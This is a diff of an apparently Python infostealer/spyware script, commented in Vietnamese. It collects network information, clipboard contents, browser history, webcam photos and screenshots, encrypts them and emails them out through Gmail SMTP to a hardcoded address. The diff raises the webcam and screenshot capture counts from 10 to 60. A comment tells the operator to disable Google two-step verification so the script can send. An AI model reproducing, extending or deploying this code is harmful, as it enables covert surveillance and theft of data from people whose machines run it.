@@ -42,15 +42,12 @@ def smtp_handler(email_address: str, password: str, email: MIMEMultipart):
     #  */
     """
      Tạo điều kiện thuận lợi cho việc gửi email có dữ liệu được mã hóa để lọc.
-
      :param email_address: Tài khoản Gmail được liên kết nơi dữ liệu được mã hóa sẽ được gửi.
      :param pass: Mật khẩu ứng dụng được tạo trong tài khoản Google của người dùng Gmail
      :param email: Phiên bản email sẽ được gửi.
      :param email: nhớ tắt xác minh 2 bước cua gg de chob the dăng nhập và gửi code!
-
      """
     try:
-
         with smtplib.SMTP('smtp.gmail.com', 587) as session:
 
             session.starttls()
@@ -64,7 +61,6 @@ def smtp_handler(email_address: str, password: str, email: MIMEMultipart):
             # Gửi email và thoát khỏi phiên làm việc#
             session.sendmail(email_address,email_address, email.as_string())
 
-
     # Checked : Nếu xảy ra lỗi liên quan đến SMTP hoặc socket #
     except smtplib.SMTPException as mail_err:
         print_err(f'Error occurred during email session: {mail_err}')
@@ -74,7 +70,6 @@ def smtp_handler(email_address: str, password: str, email: MIMEMultipart):
 def email_attach(path: Path, attach_file: str) -> MIMEBase:
     """
      Tạo đối tượng đính kèm email và trả về nó.
-
      :param path: Đường dẫn file chứa file cần đính kèm.
      :param attachment_file: Tên file cần đính kèm.
      :return: Phiên bản đính kèm email đã được điền.
@@ -113,10 +108,8 @@ def email_header(message: MIMEMultipart, email_address: str) -> MIMEMultipart:
 def send_mail(path: Path, re_obj: object):
     """
      Tạo điều kiện gửi email theo kiểu phân đoạn dựa trên các kết quả phù hợp với biểu thức chính quy.
-
      :param path: Đường dẫn file chứa file đính kèm vào email.
      :param re_obj: Phiên bản biểu thức chính quy được biên dịch chứa các mẫu được biên dịch trước cho phần mở rộng tệp.
-
      """
     # Nhập  tk  google #
     email_address = 'tgbao312003@gmail.com'          # <--- Enter your email address
@@ -162,7 +155,6 @@ def encrypt_data(files: list, export_path: Path):
      Mã hóa tất cả dữ liệu tệp trong danh sách tham số của tệp sẽ được lọc.
      :param files: Danh sách các file cần mã hóa.
      :paramexport_path: Đường dẫn tệp chứa các tệp được mã hóa.
-     :return: Không có gì
      """
     # In the python console type: from cryptography.fernet import Fernet ; then run the command
     # below to generate a key. This key needs to be added to the key variable below as
@@ -227,8 +219,8 @@ def webcam(webcam_path: Path):
     # Khởi tạo phiên bản quay video #
     cam = cv2.VideoCapture(0)
 
-    for current in range(1, 11):
-    # for current in range(1, 61):
+    # for current in range(1, 11):
+    for current in range(1, 61):
         # Chụp ảnh chế độ xem webcam hiện tại #
         ret, img = cam.read()
         # Nếu ảnh đã được chụp #
@@ -278,15 +270,13 @@ def microphone(mic_path: Path):
 def screenshot(screenshot_path: Path):
     """
      Chụp ảnh màn hình cứ sau năm giây.
-
      :param ảnh chụp màn hình_path: Đường dẫn tệp nơi ảnh chụp màn hình sẽ được lưu trữ.
-
      """
 
     screenshot_path.mkdir(parents=True, exist_ok=True)
 
-    # for current in range(1, 61):
-    for current in range(1, 11):
+    for current in range(1, 61):
+    # for current in range(1, 11):
         pic = ImageGrab.grab()
 
         capture_path = screenshot_path / f'{current}_screenshot.png'
@@ -518,9 +508,9 @@ def get_network_info(export_path: Path, network_file: Path):
 
 def main():
     """
-    Gathers network information, clipboard contents, browser history, initiates multiprocessing, \
-    sends encrypted results, cleans up exfiltrated data, and loops back to the beginning.
-    """
+     Thu thập thông tin mạng, nội dung clipboard, lịch sử trình duyệt, bắt đầu đa xử lý,
+     gửi kết quả được mã hóa, dọn sạch dữ liệu đã lọc và lặp lại từ đầu.
+     """
     #  Windows #
     if os.name == 'nt':
         export_path = Path('C:\\Tmp\\')
